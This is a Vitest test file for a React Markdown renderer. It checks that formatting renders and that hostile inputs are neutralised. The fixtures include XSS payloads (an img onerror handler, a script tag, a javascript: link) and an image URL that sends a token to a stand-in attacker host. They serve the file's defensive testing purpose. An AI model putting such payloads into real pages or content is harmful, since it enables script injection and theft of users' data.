// SPDX-FileCopyrightText: The Opificia Authors
// SPDX-License-Identifier: AGPL-3.0-only

import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Markdown } from "./markdown.tsx";

const render = (markdown: string) => renderToStaticMarkup(<Markdown>{markdown}</Markdown>);

describe("Markdown", () => {
  it("renders headings, lists, code and tables", () => {
    const html = render("## Changes\n\n- **`config.ts`**: check entries\n\n| A | B |\n| --- | --- |\n| 1 | 2 |\n");
    expect(html).toContain("<h2");
    expect(html).toContain("<li");
    expect(html).toContain("<code");
    expect(html).toContain("<table");
  });

  it("shows raw HTML as text instead of rendering it", () => {
    const html = render('Before <img src="https://attacker.example/x.png" onerror="alert(1)"> <script>alert(1)</script> after');
    expect(html).not.toContain("<img");
    expect(html).not.toContain("<script");
    expect(html).toContain("&lt;script&gt;");
  });

  it("never loads images, so a plan cannot send data to another host", () => {
    const html = render("![secret](https://attacker.example/collect?d=token)\n\n![inline](data:image/png;base64,AAAA)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example/collect");
  });

  it("asks before opening a link, and drops script links", () => {
    const link = 'data-streamdown="link"';
    const html = render("[docs](https://example.org/docs)");
    expect(html).toContain(link);
    expect(html).not.toContain("<a ");
    const script = render("[click](javascript:alert(1))");
    expect(script).not.toContain(link);
    expect(script).not.toContain("javascript:");
  });
});
